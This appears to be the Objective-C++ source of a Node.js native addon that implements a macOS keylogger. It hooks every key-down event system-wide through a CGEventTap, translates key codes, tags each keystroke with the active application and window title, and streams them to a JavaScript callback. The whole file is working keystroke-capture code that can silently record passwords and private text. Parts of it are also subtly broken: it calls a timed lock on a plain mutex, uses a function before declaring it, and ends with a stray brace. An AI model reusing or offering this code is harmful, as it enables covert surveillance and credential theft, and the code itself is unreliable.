#include <atomic>
#include <iostream>
#include <mutex>
#include <nan.h>
#include <napi.h>
#include <queue>
#include <string>
#include <thread>

#import <AppKit/AppKit.h>
#import <Carbon/Carbon.h>
#import <Cocoa/Cocoa.h>
#import <Foundation/Foundation.h>

// Callback reference for sending keystrokes to JS
static Napi::ThreadSafeFunction tsfn;
static std::atomic<bool> isLogging(false);
static std::thread keyloggerThread;
static std::mutex keyMutex;
static std::queue<std::pair<std::string, std::string>> keystrokeQueue;

// Add global variables for event tap and run loop
static CFMachPortRef eventTap = NULL;
static CFRunLoopSourceRef runLoopSource = NULL;

// Helper function to get the active window information
NSString *GetActiveWindowTitle() {
  @autoreleasepool {
    NSWorkspace *workspace = [NSWorkspace sharedWorkspace];
    NSRunningApplication *activeApp = [workspace frontmostApplication];
    NSString *appName = [activeApp localizedName];

    if (appName == nil) {
      return @"Unknown";
    }

    // For more detailed window title, we need to use Accessibility APIs
    // This requires explicit permission from the user
    AXUIElementRef systemWideElement = AXUIElementCreateSystemWide();
    AXUIElementRef focusedElement = NULL;

    AXError error = AXUIElementCopyAttributeValue(
        systemWideElement, kAXFocusedApplicationAttribute,
        (CFTypeRef *)&focusedElement);

    if (error != kAXErrorSuccess) {
      CFRelease(systemWideElement);
      return appName;
    }

    AXUIElementRef focusedWindow = NULL;
    error = AXUIElementCopyAttributeValue(
        focusedElement, kAXFocusedWindowAttribute, (CFTypeRef *)&focusedWindow);

    if (error != kAXErrorSuccess) {
      CFRelease(systemWideElement);
      CFRelease(focusedElement);
      return appName;
    }

    CFStringRef windowTitleRef = NULL;
    error = AXUIElementCopyAttributeValue(focusedWindow, kAXTitleAttribute,
                                          (CFTypeRef *)&windowTitleRef);

    if (error != kAXErrorSuccess || windowTitleRef == NULL) {
      CFRelease(systemWideElement);
      CFRelease(focusedElement);
      CFRelease(focusedWindow);
      return appName;
    }

    NSString *windowTitle = (NSString *)windowTitleRef;
    NSString *result =
        [NSString stringWithFormat:@"%@ - %@", windowTitle, appName];

    CFRelease(systemWideElement);
    CFRelease(focusedElement);
    CFRelease(focusedWindow);
    if (windowTitleRef) {
      CFRelease(windowTitleRef);
    }

    return result;
  }
}

// Callback function for keystrokes
CGEventRef KeyEventCallback(CGEventTapProxy proxy, CGEventType type,
                            CGEventRef event, void *userData) {
  if (!isLogging || !event) {
    return event;
  }

  if (type != kCGEventKeyDown) {
    return event;
  }

  @autoreleasepool {
    // Get the pressed key
    CGKeyCode keyCode =
        (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Create a local string to store the key
    std::string keyString;
    std::string windowString;

    // Get window title first to avoid potential race conditions
    @try {
      NSString *windowTitle = GetActiveWindowTitle();
      if (windowTitle) {
        windowString = [windowTitle UTF8String];
      } else {
        windowString = "Unknown";
      }
    } @catch (...) {
      windowString = "Unknown";
    }

    // Handle special keys first with additional safety checks
    if (keyCode == kVK_Return) {
      keyString = "\\n";
    } else if (keyCode == kVK_Tab ||
               keyCode == 48) { // Handle both tab key codes
      keyString = "\\t";
    } else if (keyCode == kVK_Space) {
      keyString = " ";
    } else if (keyCode == kVK_Delete) {
      keyString = "\\b";
    } else {
      // Convert regular keys with additional safety
      @try {
        UniChar characters[4] = {0}; // Initialize array
        UniCharCount length = 0;

        TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
        if (currentKeyboard) {
          CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(
              currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
          if (layoutData) {
            const UCKeyboardLayout *keyboardLayout =
                (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
            if (keyboardLayout) {
              UInt32 deadKeyState = 0;
              OSStatus status = UCKeyTranslate(
                  keyboardLayout, keyCode, kUCKeyActionDown, 0, LMGetKbdType(),
                  kUCKeyTranslateNoDeadKeysBit, &deadKeyState,
                  sizeof(characters) / sizeof(UniChar), &length, characters);

              if (status != noErr) {
                length = 0; // Reset length on error
              }
            }
          }
          CFRelease(currentKeyboard);
        }

        if (length > 0 && length <= 4) { // Validate length
          @autoreleasepool {
            NSString *nsString = [[NSString alloc] initWithCharacters:characters
                                                               length:length];
            if (nsString) {
              keyString = [nsString UTF8String];
            } else {
              keyString = "[invalid]";
            }
          }
        } else {
          keyString = "[unknown]";
        }
      } @catch (...) {
        keyString = "[error]";
      }
    }

    // Add to queue safely with timeout
    try {
      std::unique_lock<std::mutex> lock(keyMutex, std::defer_lock);
      if (lock.try_lock_for(
              std::chrono::milliseconds(100))) { // Timeout after 100ms
        keystrokeQueue.push({keyString, windowString});
        lock.unlock();
      }
    } catch (...) {
      // Ignore queue errors to prevent crashes
    }
  }

  return event;
}

// Worker thread for sending keystrokes to JS
void KeyloggerWorker() {
  std::cout << "KeyloggerWorker: Thread started" << std::endl;

  while (isLogging) {
    std::pair<std::string, std::string> keystroke;
    bool hasKeystroke = false;

    {
      std::lock_guard<std::mutex> lock(keyMutex);
      if (!keystrokeQueue.empty()) {
        keystroke = keystrokeQueue.front();
        keystrokeQueue.pop();
        hasKeystroke = true;
        std::cout << "KeyloggerWorker: Keystroke popped from queue: "
                  << keystroke.first << std::endl;
      }
    }

    if (hasKeystroke && tsfn) {
      std::cout << "KeyloggerWorker: Sending keystroke to JS: "
                << keystroke.first << std::endl;

      auto callback = [keystroke](Napi::Env env, Napi::Function jsCallback) {
        // Create an object with key and window
        Napi::Object obj = Napi::Object::New(env);
        obj.Set("key", Napi::String::New(env, keystroke.first));
        obj.Set("window", Napi::String::New(env, keystroke.second));

        // Call the JS callback
        std::cout << "KeyloggerWorker: Calling JS callback" << std::endl;
        jsCallback.Call({obj});
        std::cout << "KeyloggerWorker: JS callback returned" << std::endl;
      };

      tsfn.BlockingCall(callback);
    }

    // Sleep to avoid high CPU usage
    std::this_thread::sleep_for(std::chrono::milliseconds(10));
  }
}

// Use the Main Thread's Run Loop instead of creating a new one
void StartKeyloggerMac(const Napi::CallbackInfo &info) {
  Napi::Env env = info.Env();

  // Check if already running
  if (isLogging) {
    return;
  }

  // Validate callback
  if (info.Length() < 1 || !info[0].IsFunction()) {
    Napi::TypeError::New(env, "Callback function is required")
        .ThrowAsJavaScriptException();
    return;
  }

  try {
    // Create ThreadSafeFunction first
    tsfn = Napi::ThreadSafeFunction::New(env, info[0].As<Napi::Function>(),
                                         "Keylogger Callback", 0, 1,
                                         [](Napi::Env) { isLogging = false; });

    // Clear any existing event tap
    if (eventTap) {
      CGEventTapEnable(eventTap, false);
      CFRelease(eventTap);
      eventTap = NULL;
    }

    if (runLoopSource) {
      CFRunLoopRemoveSource(CFRunLoopGetMain(), runLoopSource,
                            kCFRunLoopCommonModes);
      CFRelease(runLoopSource);
      runLoopSource = NULL;
    }

    // Create new event tap
    eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault,
        CGEventMaskBit(kCGEventKeyDown), KeyEventCallback, NULL);

    if (!eventTap) {
      tsfn.Release();
      Napi::Error::New(env, "Failed to create event tap")
          .ThrowAsJavaScriptException();
      return;
    }

    // Create run loop source
    runLoopSource =
        CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    if (!runLoopSource) {
      CFRelease(eventTap);
      eventTap = NULL;
      tsfn.Release();
      Napi::Error::New(env, "Failed to create run loop source")
          .ThrowAsJavaScriptException();
      return;
    }

    // Add to main run loop
    CFRunLoopAddSource(CFRunLoopGetMain(), runLoopSource,
                       kCFRunLoopCommonModes);

    // Enable the event tap
    CGEventTapEnable(eventTap, true);

    // Start logging
    isLogging = true;

    // Start worker thread
    try {
      if (keyloggerThread.joinable()) {
        keyloggerThread.join();
      }
      keyloggerThread = std::thread(KeyloggerWorker);
    } catch (const std::exception &e) {
      StopKeyloggerMac(info);
      Napi::Error::New(env, std::string("Failed to start worker thread: ") +
                                e.what())
          .ThrowAsJavaScriptException();
      return;
    }

  } catch (const std::exception &e) {
    if (eventTap) {
      CGEventTapEnable(eventTap, false);
      CFRelease(eventTap);
      eventTap = NULL;
    }
    if (runLoopSource) {
      CFRunLoopRemoveSource(CFRunLoopGetMain(), runLoopSource,
                            kCFRunLoopCommonModes);
      CFRelease(runLoopSource);
      runLoopSource = NULL;
    }
    if (tsfn) {
      tsfn.Release();
    }
    isLogging = false;
    Napi::Error::New(env, std::string("Failed to start keylogger: ") + e.what())
        .ThrowAsJavaScriptException();
    return;
  }
}

void StopKeyloggerMac(const Napi::CallbackInfo &info) {
  if (!isLogging) {
    return;
  }

  // Stop logging first to prevent new events
  isLogging = false;

  // Clean up thread-safe function
  if (tsfn) {
    tsfn.Release();
  }

  // Wait for worker thread
  try {
    if (keyloggerThread.joinable()) {
      keyloggerThread.join();
    }
  } catch (...) {
    // Ignore thread join errors
  }

  // Clean up event tap and run loop source
  if (runLoopSource) {
    CFRunLoopRemoveSource(CFRunLoopGetMain(), runLoopSource,
                          kCFRunLoopCommonModes);
    CFRelease(runLoopSource);
    runLoopSource = NULL;
  }

  if (eventTap) {
    CGEventTapEnable(eventTap, false);
    CFRelease(eventTap);
    eventTap = NULL;
  }

  // Clear the keystroke queue
  {
    std::lock_guard<std::mutex> lock(keyMutex);
    std::queue<std::pair<std::string, std::string>> empty;
    std::swap(keystrokeQueue, empty);
  }
}

Napi::String GetActiveWindowMac(const Napi::CallbackInfo &info) {
  Napi::Env env = info.Env();

  @autoreleasepool {
    NSString *windowTitle = GetActiveWindowTitle();
    std::string title = [windowTitle UTF8String];
    return Napi::String::New(env, title);
  }
}
}